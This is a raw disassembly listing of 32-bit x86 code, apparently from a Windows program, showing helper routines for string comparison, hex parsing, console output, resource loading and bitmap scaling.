  401d09:	89 78 04             	mov    %edi,0x4(%eax)
  401d0c:	c7 00 58 a5 41 00    	movl   $0x41a558,(%eax)
  401d12:	83 48 08 ff          	orl    $0xffffffff,0x8(%eax)
  401d16:	eb 02                	jmp    0x401d1a
  401d18:	33 c0                	xor    %eax,%eax
  401d1a:	50                   	push   %eax
  401d1b:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  401d1e:	89 46 20             	mov    %eax,0x20(%esi)
  401d21:	e8 28 16 01 00       	call   0x41334e
  401d26:	8b 0b                	mov    (%ebx),%ecx
  401d28:	8b 46 20             	mov    0x20(%esi),%eax
  401d2b:	6a 01                	push   $0x1
  401d2d:	51                   	push   %ecx
  401d2e:	8d 48 08             	lea    0x8(%eax),%ecx
  401d31:	89 78 10             	mov    %edi,0x10(%eax)
  401d34:	89 78 14             	mov    %edi,0x14(%eax)
  401d37:	e8 2c 07 01 00       	call   0x412468
  401d3c:	84 c0                	test   %al,%al
  401d3e:	0f 85 b0 00 00 00    	jne    0x401df4
  401d44:	ff 15 98 a1 41 00    	call   *0x41a198
  401d4a:	53                   	push   %ebx
  401d4b:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  401d4e:	89 45 08             	mov    %eax,0x8(%ebp)
  401d51:	e8 7b f6 ff ff       	call   0x4013d1
  401d56:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401d59:	50                   	push   %eax
  401d5a:	e8 5e 16 00 00       	call   0x4033bd
  401d5f:	3b c7                	cmp    %edi,%eax
  401d61:	59                   	pop    %ecx
  401d62:	7d 3b                	jge    0x401d9f
  401d64:	ff 75 08             	push   0x8(%ebp)
  401d67:	8b 06                	mov    (%esi),%eax
  401d69:	6a 6a                	push   $0x6a
  401d6b:	56                   	push   %esi
  401d6c:	ff 50 20             	call   *0x20(%eax)
  401d6f:	ff 75 e4             	push   -0x1c(%ebp)
  401d72:	8b f0                	mov    %eax,%esi
  401d74:	e8 f1 74 01 00       	call   0x41926a
  401d79:	8b 45 0c             	mov    0xc(%ebp),%eax
  401d7c:	3b c7                	cmp    %edi,%eax
  401d7e:	59                   	pop    %ecx
  401d7f:	74 06                	je     0x401d87
  401d81:	8b 08                	mov    (%eax),%ecx
  401d83:	50                   	push   %eax
  401d84:	ff 51 08             	call   *0x8(%ecx)
  401d87:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401d8a:	e8 e5 07 01 00       	call   0x412574
  401d8f:	ff 75 f0             	push   -0x10(%ebp)
  401d92:	e8 d3 74 01 00       	call   0x41926a
  401d97:	59                   	pop    %ecx
  401d98:	8b fe                	mov    %esi,%edi
  401d9a:	e9 b7 fd ff ff       	jmp    0x401b56
  401d9f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401da2:	66 89 3c 41          	mov    %di,(%ecx,%eax,2)
  401da6:	ff 75 e4             	push   -0x1c(%ebp)
  401da9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401dac:	e8 36 1c 00 00       	call   0x4039e7
  401db1:	85 c0                	test   %eax,%eax
  401db3:	59                   	pop    %ecx
  401db4:	75 0a                	jne    0x401dc0
  401db6:	8b 06                	mov    (%esi),%eax
  401db8:	6a 68                	push   $0x68
  401dba:	56                   	push   %esi
  401dbb:	ff 50 1c             	call   *0x1c(%eax)
  401dbe:	eb af                	jmp    0x401d6f
  401dc0:	8b 1b                	mov    (%ebx),%ebx
  401dc2:	8b 46 20             	mov    0x20(%esi),%eax
  401dc5:	6a 01                	push   $0x1
  401dc7:	53                   	push   %ebx
  401dc8:	8d 48 08             	lea    0x8(%eax),%ecx
  401dcb:	89 78 10             	mov    %edi,0x10(%eax)
  401dce:	89 78 14             	mov    %edi,0x14(%eax)
  401dd1:	e8 92 06 01 00       	call   0x412468
  401dd6:	84 c0                	test   %al,%al
  401dd8:	75 11                	jne    0x401deb
  401dda:	8b 1e                	mov    (%esi),%ebx
  401ddc:	ff 15 98 a1 41 00    	call   *0x41a198
  401de2:	50                   	push   %eax
  401de3:	6a 6a                	push   $0x6a
  401de5:	56                   	push   %esi
  401de6:	ff 53 20             	call   *0x20(%ebx)
  401de9:	eb 84                	jmp    0x401d6f
  401deb:	ff 75 e4             	push   -0x1c(%ebp)
  401dee:	e8 77 74 01 00       	call   0x41926a
  401df3:	59                   	pop    %ecx
  401df4:	8b 75 0c             	mov    0xc(%ebp),%esi
  401df7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401dfa:	56                   	push   %esi
  401dfb:	e8 b9 18 01 00       	call   0x4136b9
  401e00:	8b 45 10             	mov    0x10(%ebp),%eax
  401e03:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401e06:	89 30                	mov    %esi,(%eax)
  401e08:	e8 67 07 01 00       	call   0x412574
  401e0d:	eb 23                	jmp    0x401e32
  401e0f:	8b 45 10             	mov    0x10(%ebp),%eax
  401e12:	89 38                	mov    %edi,(%eax)
  401e14:	e9 fb fd ff ff       	jmp    0x401c14
  401e19:	8b 3e                	mov    (%esi),%edi
  401e1b:	ff 15 98 a1 41 00    	call   *0x41a198
  401e21:	50                   	push   %eax
  401e22:	6a 69                	push   $0x69
  401e24:	56                   	push   %esi
  401e25:	ff 57 20             	call   *0x20(%edi)
  401e28:	e9 e5 fd ff ff       	jmp    0x401c12
  401e2d:	8b 45 10             	mov    0x10(%ebp),%eax
  401e30:	89 38                	mov    %edi,(%eax)
  401e32:	ff 75 f0             	push   -0x10(%ebp)
  401e35:	e8 30 74 01 00       	call   0x41926a
  401e3a:	59                   	pop    %ecx
  401e3b:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401e3e:	e8 31 07 01 00       	call   0x412574
  401e43:	33 c0                	xor    %eax,%eax
  401e45:	eb 1d                	jmp    0x401e64
  401e47:	8b 06                	mov    (%esi),%eax
  401e49:	6a 64                	push   $0x64
  401e4b:	56                   	push   %esi
  401e4c:	ff 50 1c             	call   *0x1c(%eax)
  401e4f:	ff 75 f0             	push   -0x10(%ebp)
  401e52:	8b f0                	mov    %eax,%esi
  401e54:	e8 11 74 01 00       	call   0x41926a
  401e59:	59                   	pop    %ecx
  401e5a:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401e5d:	e8 12 07 01 00       	call   0x412574
  401e62:	8b c6                	mov    %esi,%eax
  401e64:	5e                   	pop    %esi
  401e65:	5f                   	pop    %edi
  401e66:	5b                   	pop    %ebx
  401e67:	c9                   	leave
  401e68:	c2 10 00             	ret    $0x10
  401e6b:	56                   	push   %esi
  401e6c:	6a 00                	push   $0x0
  401e6e:	ff 74 24 0c          	push   0xc(%esp)
  401e72:	ff 15 a8 a1 41 00    	call   *0x41a1a8
  401e78:	85 c0                	test   %eax,%eax
  401e7a:	75 30                	jne    0x401eac
  401e7c:	ff 15 98 a1 41 00    	call   *0x41a198
  401e82:	be b7 00 00 00       	mov    $0xb7,%esi
  401e87:	3b c6                	cmp    %esi,%eax
  401e89:	74 0b                	je     0x401e96
  401e8b:	50                   	push   %eax
  401e8c:	ff 15 84 a1 41 00    	call   *0x41a184
  401e92:	33 c0                	xor    %eax,%eax
  401e94:	5e                   	pop    %esi
  401e95:	c3                   	ret
  401e96:	ff 74 24 08          	push   0x8(%esp)
  401e9a:	ff 15 a4 a1 41 00    	call   *0x41a1a4
  401ea0:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ea3:	74 07                	je     0x401eac
  401ea5:	a8 10                	test   $0x10,%al
  401ea7:	75 03                	jne    0x401eac
  401ea9:	56                   	push   %esi
  401eaa:	eb e0                	jmp    0x401e8c
  401eac:	33 c0                	xor    %eax,%eax
  401eae:	40                   	inc    %eax
  401eaf:	5e                   	pop    %esi
  401eb0:	c3                   	ret
  401eb1:	3c 0a                	cmp    $0xa,%al
  401eb3:	75 09                	jne    0x401ebe
  401eb5:	ff 05 80 e0 41 00    	incl   0x41e080
  401ebb:	04 f7                	add    $0xf7,%al
  401ebd:	c3                   	ret
  401ebe:	3c 20                	cmp    $0x20,%al
  401ec0:	74 0f                	je     0x401ed1
  401ec2:	3c 0d                	cmp    $0xd,%al
  401ec4:	74 0b                	je     0x401ed1
  401ec6:	84 c0                	test   %al,%al
  401ec8:	74 07                	je     0x401ed1
  401eca:	3c 09                	cmp    $0x9,%al
  401ecc:	74 03                	je     0x401ed1
  401ece:	33 c0                	xor    %eax,%eax
  401ed0:	c3                   	ret
  401ed1:	33 c0                	xor    %eax,%eax
  401ed3:	40                   	inc    %eax
  401ed4:	c3                   	ret
  401ed5:	55                   	push   %ebp
  401ed6:	8b ec                	mov    %esp,%ebp
  401ed8:	51                   	push   %ecx
  401ed9:	8a 45 08             	mov    0x8(%ebp),%al
  401edc:	6a 00                	push   $0x0
  401ede:	88 45 08             	mov    %al,0x8(%ebp)
  401ee1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401ee4:	50                   	push   %eax
  401ee5:	6a 03                	push   $0x3
  401ee7:	8d 45 08             	lea    0x8(%ebp),%eax
  401eea:	50                   	push   %eax
  401eeb:	6a f5                	push   $0xfffffff5
  401eed:	c6 45 09 0d          	movb   $0xd,0x9(%ebp)
  401ef1:	c6 45 0a 0a          	movb   $0xa,0xa(%ebp)
  401ef5:	ff 15 b0 a1 41 00    	call   *0x41a1b0
  401efb:	50                   	push   %eax
  401efc:	ff 15 ac a1 41 00    	call   *0x41a1ac
  401f02:	c9                   	leave
  401f03:	c3                   	ret
  401f04:	8b 44 24 04          	mov    0x4(%esp),%eax
  401f08:	8d 48 d0             	lea    -0x30(%eax),%ecx
  401f0b:	66 83 f9 09          	cmp    $0x9,%cx
  401f0f:	77 07                	ja     0x401f18
  401f11:	0f b7 c0             	movzwl %ax,%eax
  401f14:	83 e8 30             	sub    $0x30,%eax
  401f17:	c3                   	ret
  401f18:	8d 48 9f             	lea    -0x61(%eax),%ecx
  401f1b:	66 83 f9 19          	cmp    $0x19,%cx
  401f1f:	77 07                	ja     0x401f28
  401f21:	0f b7 c0             	movzwl %ax,%eax
  401f24:	83 e8 57             	sub    $0x57,%eax
  401f27:	c3                   	ret
  401f28:	8d 48 bf             	lea    -0x41(%eax),%ecx
  401f2b:	66 83 f9 19          	cmp    $0x19,%cx
  401f2f:	77 07                	ja     0x401f38
  401f31:	0f b7 c0             	movzwl %ax,%eax
  401f34:	83 e8 37             	sub    $0x37,%eax
  401f37:	c3                   	ret
  401f38:	83 c8 ff             	or     $0xffffffff,%eax
  401f3b:	c3                   	ret
  401f3c:	56                   	push   %esi
  401f3d:	8b 74 24 08          	mov    0x8(%esp),%esi
  401f41:	0f b7 06             	movzwl (%esi),%eax
  401f44:	50                   	push   %eax
  401f45:	e8 ba ff ff ff       	call   0x401f04
  401f4a:	8b d0                	mov    %eax,%edx
  401f4c:	c1 e2 04             	shl    $0x4,%edx
  401f4f:	59                   	pop    %ecx
  401f50:	78 13                	js     0x401f65
  401f52:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  401f56:	50                   	push   %eax
  401f57:	e8 a8 ff ff ff       	call   0x401f04
  401f5c:	0b d0                	or     %eax,%edx
  401f5e:	59                   	pop    %ecx
  401f5f:	7c 04                	jl     0x401f65
  401f61:	8b c2                	mov    %edx,%eax
  401f63:	5e                   	pop    %esi
  401f64:	c3                   	ret
  401f65:	83 c8 ff             	or     $0xffffffff,%eax
  401f68:	5e                   	pop    %esi
  401f69:	c3                   	ret
  401f6a:	55                   	push   %ebp
  401f6b:	8b ec                	mov    %esp,%ebp
  401f6d:	51                   	push   %ecx
  401f6e:	53                   	push   %ebx
  401f6f:	56                   	push   %esi
  401f70:	57                   	push   %edi
  401f71:	33 ff                	xor    %edi,%edi
  401f73:	39 7d 10             	cmp    %edi,0x10(%ebp)
  401f76:	7e 40                	jle    0x401fb8
  401f78:	8b 75 0c             	mov    0xc(%ebp),%esi
  401f7b:	8b 45 08             	mov    0x8(%ebp),%eax
  401f7e:	2b c6                	sub    %esi,%eax
  401f80:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f83:	eb 03                	jmp    0x401f88
  401f85:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f88:	0f b7 04 30          	movzwl (%eax,%esi,1),%eax
  401f8c:	66 85 c0             	test   %ax,%ax
  401f8f:	74 27                	je     0x401fb8
  401f91:	66 83 3e 00          	cmpw   $0x0,(%esi)
  401f95:	74 21                	je     0x401fb8
  401f97:	50                   	push   %eax
  401f98:	e8 23 07 01 00       	call   0x4126c0
  401f9d:	66 8b d8             	mov    %ax,%bx
  401fa0:	0f b7 06             	movzwl (%esi),%eax
  401fa3:	50                   	push   %eax
  401fa4:	e8 17 07 01 00       	call   0x4126c0
  401fa9:	66 3b d8             	cmp    %ax,%bx
  401fac:	59                   	pop    %ecx
  401fad:	59                   	pop    %ecx
  401fae:	75 15                	jne    0x401fc5
  401fb0:	47                   	inc    %edi
  401fb1:	46                   	inc    %esi
  401fb2:	46                   	inc    %esi
  401fb3:	3b 7d 10             	cmp    0x10(%ebp),%edi
  401fb6:	7c cd                	jl     0x401f85
  401fb8:	33 c0                	xor    %eax,%eax
  401fba:	3b 7d 10             	cmp    0x10(%ebp),%edi
  401fbd:	0f 95 c0             	setne  %al
  401fc0:	5f                   	pop    %edi
  401fc1:	5e                   	pop    %esi
  401fc2:	5b                   	pop    %ebx
  401fc3:	c9                   	leave
  401fc4:	c3                   	ret
  401fc5:	8b 45 08             	mov    0x8(%ebp),%eax
  401fc8:	8d 34 3f             	lea    (%edi,%edi,1),%esi
  401fcb:	0f b7 04 06          	movzwl (%esi,%eax,1),%eax
  401fcf:	50                   	push   %eax
  401fd0:	e8 eb 06 01 00       	call   0x4126c0
  401fd5:	0f b7 f8             	movzwl %ax,%edi
  401fd8:	8b 45 0c             	mov    0xc(%ebp),%eax
  401fdb:	0f b7 04 06          	movzwl (%esi,%eax,1),%eax
  401fdf:	50                   	push   %eax
  401fe0:	e8 db 06 01 00       	call   0x4126c0
  401fe5:	59                   	pop    %ecx
  401fe6:	59                   	pop    %ecx
  401fe7:	0f b7 c8             	movzwl %ax,%ecx
  401fea:	8b c7                	mov    %edi,%eax
  401fec:	2b c1                	sub    %ecx,%eax
  401fee:	eb d0                	jmp    0x401fc0
  401ff0:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401ff5:	74 11                	je     0x402008
  401ff7:	68 00 80 00 00       	push   $0x8000
  401ffc:	6a 00                	push   $0x0
  401ffe:	ff 74 24 0c          	push   0xc(%esp)
  402002:	ff 15 b4 a1 41 00    	call   *0x41a1b4
  402008:	c3                   	ret
  402009:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40200e:	74 06                	je     0x402016
  402010:	ff 25 cc a1 41 00    	jmp    *0x41a1cc
  402016:	c3                   	ret
  402017:	55                   	push   %ebp
  402018:	8b ec                	mov    %esp,%ebp
  40201a:	83 ec 1c             	sub    $0x1c,%esp
  40201d:	56                   	push   %esi
  40201e:	57                   	push   %edi
  40201f:	33 f6                	xor    %esi,%esi
  402021:	56                   	push   %esi
  402022:	56                   	push   %esi
  402023:	ff 15 70 a1 41 00    	call   *0x41a170
  402029:	50                   	push   %eax
  40202a:	56                   	push   %esi
  40202b:	56                   	push   %esi
  40202c:	6a 05                	push   $0x5
  40202e:	6a 05                	push   $0x5
  402030:	6a f6                	push   $0xfffffff6
  402032:	6a f6                	push   $0xfffffff6
  402034:	56                   	push   %esi
  402035:	68 84 a5 41 00       	push   $0x41a584
  40203a:	68 74 a5 41 00       	push   $0x41a574
  40203f:	56                   	push   %esi
  402040:	ff 15 a0 a2 41 00    	call   *0x41a2a0
  402046:	8b f8                	mov    %eax,%edi
  402048:	3b fe                	cmp    %esi,%edi
  40204a:	74 33                	je     0x40207f
  40204c:	56                   	push   %esi
  40204d:	6a 01                	push   $0x1
  40204f:	6a 01                	push   $0x1
  402051:	57                   	push   %edi
  402052:	ff 15 a4 a2 41 00    	call   *0x41a2a4
  402058:	56                   	push   %esi
  402059:	56                   	push   %esi
  40205a:	56                   	push   %esi
  40205b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40205e:	50                   	push   %eax
  40205f:	ff 15 a8 a2 41 00    	call   *0x41a2a8
  402065:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402068:	50                   	push   %eax
  402069:	ff 15 ac a2 41 00    	call   *0x41a2ac
  40206f:	6a 01                	push   $0x1
  402071:	57                   	push   %edi
  402072:	ff 15 b0 a2 41 00    	call   *0x41a2b0
  402078:	57                   	push   %edi
  402079:	ff 15 b4 a2 41 00    	call   *0x41a2b4
  40207f:	5f                   	pop    %edi
  402080:	5e                   	pop    %esi
  402081:	c9                   	leave
  402082:	c3                   	ret
  402083:	53                   	push   %ebx
  402084:	ff 74 24 08          	push   0x8(%esp)
  402088:	ff 15 94 a2 41 00    	call   *0x41a294
  40208e:	8b d8                	mov    %eax,%ebx
  402090:	85 db                	test   %ebx,%ebx
  402092:	75 02                	jne    0x402096
  402094:	5b                   	pop    %ebx
  402095:	c3                   	ret
  402096:	56                   	push   %esi
  402097:	57                   	push   %edi
  402098:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40209c:	57                   	push   %edi
  40209d:	ff 74 24 14          	push   0x14(%esp)
  4020a1:	ff 15 98 a2 41 00    	call   *0x41a298
  4020a7:	8b 35 dc a2 41 00    	mov    0x41a2dc,%esi
  4020ad:	57                   	push   %edi
  4020ae:	53                   	push   %ebx
  4020af:	ff d6                	call   *%esi
  4020b1:	83 c7 08             	add    $0x8,%edi
  4020b4:	57                   	push   %edi
  4020b5:	53                   	push   %ebx
  4020b6:	ff d6                	call   *%esi
  4020b8:	5f                   	pop    %edi
  4020b9:	33 c0                	xor    %eax,%eax
  4020bb:	5e                   	pop    %esi
  4020bc:	40                   	inc    %eax
  4020bd:	5b                   	pop    %ebx
  4020be:	c3                   	ret
  4020bf:	55                   	push   %ebp
  4020c0:	8b ec                	mov    %esp,%ebp
  4020c2:	83 ec 44             	sub    $0x44,%esp
  4020c5:	53                   	push   %ebx
  4020c6:	56                   	push   %esi
  4020c7:	57                   	push   %edi
  4020c8:	6a 00                	push   $0x0
  4020ca:	ff 15 70 a1 41 00    	call   *0x41a170
  4020d0:	8b 35 58 a1 41 00    	mov    0x41a158,%esi
  4020d6:	8b d8                	mov    %eax,%ebx
  4020d8:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  4020df:	50                   	push   %eax
  4020e0:	ff 75 0c             	push   0xc(%ebp)
  4020e3:	ff 75 08             	push   0x8(%ebp)
  4020e6:	53                   	push   %ebx
  4020e7:	ff d6                	call   *%esi
  4020e9:	8b f8                	mov    %eax,%edi
  4020eb:	85 ff                	test   %edi,%edi
  4020ed:	75 14                	jne    0x402103
  4020ef:	68 09 04 00 00       	push   $0x409
  4020f4:	ff 75 0c             	push   0xc(%ebp)
  4020f7:	ff 75 08             	push   0x8(%ebp)
  4020fa:	53                   	push   %ebx
  4020fb:	ff d6                	call   *%esi
  4020fd:	8b f8                	mov    %eax,%edi
  4020ff:	85 ff                	test   %edi,%edi
  402101:	74 26                	je     0x402129
  402103:	8b 75 10             	mov    0x10(%ebp),%esi
  402106:	85 f6                	test   %esi,%esi
  402108:	74 0a                	je     0x402114
  40210a:	57                   	push   %edi
  40210b:	53                   	push   %ebx
  40210c:	ff 15 5c a1 41 00    	call   *0x41a15c
  402112:	89 06                	mov    %eax,(%esi)
  402114:	57                   	push   %edi
  402115:	53                   	push   %ebx
  402116:	ff 15 60 a1 41 00    	call   *0x41a160
  40211c:	85 c0                	test   %eax,%eax
  40211e:	74 09                	je     0x402129
  402120:	50                   	push   %eax
  402121:	ff 15 64 a1 41 00    	call   *0x41a164
  402127:	eb 7a                	jmp    0x4021a3
  402129:	83 3d 90 e9 41 00 00 	cmpl   $0x0,0x41e990
  402130:	75 6f                	jne    0x4021a1
  402132:	8b 35 68 a1 41 00    	mov    0x41a168,%esi
  402138:	68 d0 a5 41 00       	push   $0x41a5d0
  40213d:	bb c4 a5 41 00       	mov    $0x41a5c4,%ebx
  402142:	53                   	push   %ebx
  402143:	c7 05 90 e9 41 00 01 	movl   $0x1,0x41e990
  40214a:	00 00 00 
  40214d:	ff d6                	call   *%esi
  40214f:	8b 3d 6c a1 41 00    	mov    0x41a16c,%edi
  402155:	50                   	push   %eax
  402156:	ff d7                	call   *%edi
  402158:	6a 00                	push   $0x0
  40215a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40215d:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  402164:	68 09 04 00 00       	push   $0x409
  402169:	6a 00                	push   $0x0
  40216b:	50                   	push   %eax
  40216c:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40216f:	68 a8 a5 41 00       	push   $0x41a5a8
  402174:	50                   	push   %eax
  402175:	ff 15 c0 a2 41 00    	call   *0x41a2c0
  40217b:	83 c4 18             	add    $0x18,%esp
  40217e:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402182:	75 12                	jne    0x402196
  402184:	68 88 a5 41 00       	push   $0x41a588
  402189:	53                   	push   %ebx
  40218a:	ff d6                	call   *%esi
  40218c:	50                   	push   %eax
  40218d:	ff d7                	call   *%edi
  40218f:	85 c0                	test   %eax,%eax
  402191:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402194:	74 0b                	je     0x4021a1
  402196:	6a 00                	push   $0x0
  402198:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40219b:	50                   	push   %eax
  40219c:	6a 04                	push   $0x4
  40219e:	ff 55 fc             	call   *-0x4(%ebp)
  4021a1:	33 c0                	xor    %eax,%eax
  4021a3:	5f                   	pop    %edi
  4021a4:	5e                   	pop    %esi
  4021a5:	5b                   	pop    %ebx
  4021a6:	c9                   	leave
  4021a7:	c3                   	ret
  4021a8:	55                   	push   %ebp
  4021a9:	8b ec                	mov    %esp,%ebp
  4021ab:	83 ec 2c             	sub    $0x2c,%esp
  4021ae:	53                   	push   %ebx
  4021af:	56                   	push   %esi
  4021b0:	57                   	push   %edi
  4021b1:	33 ff                	xor    %edi,%edi
  4021b3:	57                   	push   %edi
  4021b4:	ff 15 88 a2 41 00    	call   *0x41a288
  4021ba:	6a 58                	push   $0x58
  4021bc:	50                   	push   %eax
  4021bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021c0:	ff 15 30 a0 41 00    	call   *0x41a030
  4021c6:	83 f8 01             	cmp    $0x1,%eax
  4021c9:	7d 03                	jge    0x4021ce
  4021cb:	6a 60                	push   $0x60
  4021cd:	58                   	pop    %eax
  4021ce:	8b 35 54 a1 41 00    	mov    0x41a154,%esi
  4021d4:	6a 60                	push   $0x60
  4021d6:	6a 64                	push   $0x64
  4021d8:	50                   	push   %eax
  4021d9:	ff d6                	call   *%esi
  4021db:	83 f8 76             	cmp    $0x76,%eax
  4021de:	7c 0e                	jl     0x4021ee
  4021e0:	3d 91 00 00 00       	cmp    $0x91,%eax
  4021e5:	7f 12                	jg     0x4021f9
  4021e7:	6a 04                	push   $0x4
  4021e9:	5b                   	pop    %ebx
  4021ea:	6a 03                	push   $0x3
  4021ec:	eb 10                	jmp    0x4021fe
  4021ee:	3d 91 00 00 00       	cmp    $0x91,%eax
  4021f3:	0f 8e be 00 00 00    	jle    0x4022b7
  4021f9:	6a 03                	push   $0x3
  4021fb:	5b                   	pop    %ebx
  4021fc:	6a 02                	push   $0x2
  4021fe:	5f                   	pop    %edi
  4021ff:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  402202:	50                   	push   %eax
  402203:	6a 18                	push   $0x18
  402205:	ff 75 08             	push   0x8(%ebp)
  402208:	ff 15 40 a0 41 00    	call   *0x41a040
  40220e:	57                   	push   %edi
  40220f:	53                   	push   %ebx
  402210:	ff 75 d8             	push   -0x28(%ebp)
  402213:	ff d6                	call   *%esi
  402215:	57                   	push   %edi
  402216:	53                   	push   %ebx
  402217:	ff 75 dc             	push   -0x24(%ebp)
  40221a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40221d:	ff d6                	call   *%esi
  40221f:	ff 75 fc             	push   -0x4(%ebp)
  402222:	8b 35 18 a0 41 00    	mov    0x41a018,%esi
  402228:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40222b:	ff d6                	call   *%esi
  40222d:	ff 75 fc             	push   -0x4(%ebp)
  402230:	8b d8                	mov    %eax,%ebx
  402232:	ff d6                	call   *%esi
  402234:	ff 75 08             	push   0x8(%ebp)
  402237:	8b 35 38 a0 41 00    	mov    0x41a038,%esi
  40223d:	53                   	push   %ebx
  40223e:	8b f8                	mov    %eax,%edi
  402240:	ff d6                	call   *%esi
  402242:	ff 75 f8             	push   -0x8(%ebp)
  402245:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402248:	ff 75 f4             	push   -0xc(%ebp)
  40224b:	ff 75 fc             	push   -0x4(%ebp)
  40224e:	ff 15 34 a0 41 00    	call   *0x41a034
  402254:	50                   	push   %eax
  402255:	57                   	push   %edi
  402256:	ff d6                	call   *%esi
  402258:	6a 04                	push   $0x4
  40225a:	57                   	push   %edi
  40225b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40225e:	ff 15 3c a0 41 00    	call   *0x41a03c
  402264:	68 20 00 cc 00       	push   $0xcc0020
  402269:	ff 75 dc             	push   -0x24(%ebp)
  40226c:	33 c0                	xor    %eax,%eax
  40226e:	ff 75 d8             	push   -0x28(%ebp)
  402271:	50                   	push   %eax
  402272:	50                   	push   %eax
  402273:	53                   	push   %ebx
  402274:	ff 75 f8             	push   -0x8(%ebp)
  402277:	ff 75 f4             	push   -0xc(%ebp)
  40227a:	50                   	push   %eax
  40227b:	50                   	push   %eax
  40227c:	57                   	push   %edi
  40227d:	ff 15 2c a0 41 00    	call   *0x41a02c
  402283:	6a 07                	push   $0x7
  402285:	57                   	push   %edi
  402286:	ff 15 28 a0 41 00    	call   *0x41a028
  40228c:	ff 75 f0             	push   -0x10(%ebp)
  40228f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402292:	53                   	push   %ebx
  402293:	ff d6                	call   *%esi
  402295:	ff 75 ec             	push   -0x14(%ebp)
  402298:	57                   	push   %edi
  402299:	ff d6                	call   *%esi
  40229b:	8b 35 24 a0 41 00    	mov    0x41a024,%esi
  4022a1:	53                   	push   %ebx
  4022a2:	ff d6                	call   *%esi
  4022a4:	57                   	push   %edi
  4022a5:	ff d6                	call   *%esi
  4022a7:	ff 75 fc             	push   -0x4(%ebp)
  4022aa:	6a 00                	push   $0x0
  4022ac:	ff 15 8c a2 41 00    	call   *0x41a28c
  4022b2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022b5:	eb 17                	jmp    0x4022ce
  4022b7:	ff 75 fc             	push   -0x4(%ebp)
  4022ba:	57                   	push   %edi
  4022bb:	ff 15 8c a2 41 00    	call   *0x41a28c
  4022c1:	57                   	push   %edi
  4022c2:	57                   	push   %edi
  4022c3:	57                   	push   %edi
  4022c4:	57                   	push   %edi
  4022c5:	ff 75 08             	push   0x8(%ebp)
  4022c8:	ff 15 54 a3 41 00    	call   *0x41a354
  4022ce:	5f                   	pop    %edi
  4022cf:	5e                   	pop    %esi
  4022d0:	5b                   	pop    %ebx
  4022d1:	c9                   	leave
  4022d2:	c3                   	ret
  4022d3:	55                   	push   %ebp
  4022d4:	8b ec                	mov    %esp,%ebp
  4022d6:	83 ec 68             	sub    $0x68,%esp
  4022d9:	53                   	push   %ebx
  4022da:	56                   	push   %esi
  4022db:	57                   	push   %edi
  4022dc:	6a 40                	push   $0x40
  4022de:	8d 45 98             	lea    -0x68(%ebp),%eax
  4022e1:	50                   	push   %eax
  4022e2:	ff 75 08             	push   0x8(%ebp)
  4022e5:	ff 15 9c a2 41 00    	call   *0x41a29c
  4022eb:	85 c0                	test   %eax,%eax
  4022ed:	0f 84 2d 01 00 00    	je     0x402420
  4022f3:	68 f8 a5 41 00       	push   $0x41a5f8
  4022f8:	8d 45 98             	lea    -0x68(%ebp),%eax
  4022fb:	50                   	push   %eax
  4022fc:	ff 15 48 a1 41 00    	call   *0x41a148
  402302:	85 c0                	test   %eax,%eax
  402304:	0f 85 16 01 00 00    	jne    0x402420
  40230a:	6a f0                	push   $0xfffffff0
  40230c:	ff 75 08             	push   0x8(%ebp)
  40230f:	ff 15 7c a2 41 00    	call   *0x41a27c
  402315:	a8 0e                	test   $0xe,%al
  402317:	0f 84 03 01 00 00    	je     0x402420
  40231d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402320:	50                   	push   %eax
  402321:	ff 75 08             	push   0x8(%ebp)
  402324:	ff 15 80 a2 41 00    	call   *0x41a280
  40232a:	0f b7 c0             	movzwl %ax,%eax
  40232d:	50                   	push   %eax
  40232e:	68 f0 a5 41 00       	push   $0x41a5f0
  402333:	e8 87 fd ff ff       	call   0x4020bf
  402338:	8b d8                	mov    %eax,%ebx
  40233a:	33 f6                	xor    %esi,%esi
  40233c:	83 c4 0c             	add    $0xc,%esp
  40233f:	3b de                	cmp    %esi,%ebx
  402341:	0f 84 d9 00 00 00    	je     0x402420
  402347:	83 7d f8 10          	cmpl   $0x10,-0x8(%ebp)
  40234b:	0f 82 cf 00 00 00    	jb     0x402420
  402351:	ff 75 f8             	push   -0x8(%ebp)
  402354:	6a 40                	push   $0x40
  402356:	ff 15 4c a1 41 00    	call   *0x41a14c
  40235c:	ff 75 f8             	push   -0x8(%ebp)
  40235f:	8b f8                	mov    %eax,%edi
  402361:	53                   	push   %ebx
  402362:	57                   	push   %edi
  402363:	e8 52 6f 01 00       	call   0x4192ba
  402368:	83 c4 0c             	add    $0xc,%esp
  40236b:	56                   	push   %esi
  40236c:	ff 15 64 a3 41 00    	call   *0x41a364
  402372:	8d 45 f4             	lea    -0xc(%ebp),%eax
